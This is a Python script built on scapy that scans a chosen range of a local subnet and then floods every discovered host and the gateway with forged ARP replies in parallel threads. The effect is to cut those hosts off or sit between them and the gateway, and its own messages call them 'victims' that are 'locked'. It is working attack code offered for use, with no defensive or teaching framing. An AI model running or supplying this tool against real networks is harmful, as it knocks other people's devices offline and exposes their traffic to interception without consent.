import scapy.all as scapy
import argparse
from re import match
from time import sleep
from threading import Thread

def get_mac_by_ip(ip):
    while True:
     try:
      arp_request = scapy.ARP(pdst=ip)
      broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
      arp_request_broadcast = broadcast / arp_request
    
      ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
      return ans[0][1].hwsrc
     except IndexError:
      continue

def spoof(target_ip, spoof_ip):
    target_mac = get_mac_by_ip(target_ip)
    packet = scapy.ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    package = scapy.ARP(
        op=2,
        pdst=dest_ip,
        hwdst=get_mac_by_ip(dest_ip),
        psrc=source_ip,
        hwsrc=get_mac_by_ip(source_ip)
    )
    scapy.send(package, count=4, verbose=False)

def spoof_loop(target_ip, gateway_ip):
    try:
        sent_packages_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)

            sent_packages_count = sent_packages_count + 2
            print(f"\rPackages sent: {sent_packages_count}", end='')
            sleep(2)
    except KeyboardInterrupt:
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("\n\nAborted by keyboard. Restoring arp-tables..")

def scan(ip):
    arp_req_frame = scapy.ARP(pdst = ip)

    broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame

    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
    result = []
    for i in range(0,len(answered_list)):
        client_dict = {"ip" : answered_list[i][1].psrc, "mac" : answered_list[i][1].hwsrc}
        result.append(client_dict)

    return result

def drop_connection(list_of_victims, gateway_ip):
    
    print("For lock:")
    for victim in list_of_victims:
        print(f"\t{victim['ip']}")
    
    for victim in list_of_victims:
        t = Thread(target=lambda: spoof_loop(victim['ip'], gateway_ip=gateway_ip))
        t.start()
        print(f"IP:{victim} is locked.")
    
def gen_ips(target):
    
    ips = []
    target_root = match(r'\d+\.\d+\.\d+\.', target).group()
    for i in range(0, 256):
        ips.append(target_root+str(i))
    return ips

def get(ip, begin, end):
    
    goods = []

    for ip in gen_ips(ip)[int(begin):int(end)]:
        result = scan(ip)
        if result:
            goods.append(result[0])
    return goods

parser = argparse.ArgumentParser()
parser.add_argument('-v', '--victim', dest='victim', help='Victim IP')
parser.add_argument('-b', '--begin', dest='begin', help='Begin of slice')
parser.add_argument('-e', '--end', dest='end', help='End of slice')
parser.add_argument('-gi', '--gateway_ip', dest='gi', help='Optional: IP of gateway')
opt = parser.parse_args()

victims = get(opt.gi, opt.begin, opt.end)
drop_connection(victims, opt.gi)